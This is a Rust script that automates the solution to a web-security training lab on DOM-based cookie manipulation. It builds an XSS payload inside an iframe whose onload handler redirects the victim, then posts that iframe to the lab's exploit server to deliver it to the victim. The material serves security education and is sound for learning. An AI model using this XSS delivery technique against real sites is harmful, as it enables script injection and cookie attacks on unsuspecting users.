/*********************************************************************
*
* Lab: DOM-based cookie manipulation
*
* Hack Steps:
*      1. Craft an iframe with the XSS payload in its src attribute
*         and make its onload handler redirect the victim to
*         the main page, triggering the XSS payload
*      2. Deliver the exploit to the victim
*
**********************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a430063047c7d188381e1a5000c0068.web-security-academy.net";

// Change this to your exploit server URL
const EXPLOIT_SERVER_URL: &str =
    "https://exploit-0a7b0075041c7d478382e0da01750042.exploit-server.net";

fn main() {
    print!("❯❯ Delivering the exploit to the victim.. ");
    io::stdout().flush().unwrap();

    let xss_payload = "&'><img src=1 onerror=print()>";
    let payload = format!(
        r###"<iframe src="{LAB_URL}/product?productId=2{xss_payload}" onload="if(!window.x)this.src='{LAB_URL}';window.x=1;" >"###
    );

    deliver_exploit_to_victim(&payload);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn deliver_exploit_to_victim(payload: &str) {
    let client = build_web_client();
    let response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";
    client
        .post(EXPLOIT_SERVER_URL)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", response_head),
            ("responseBody", payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to deliver the exploit to the victim".red()
        ));
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
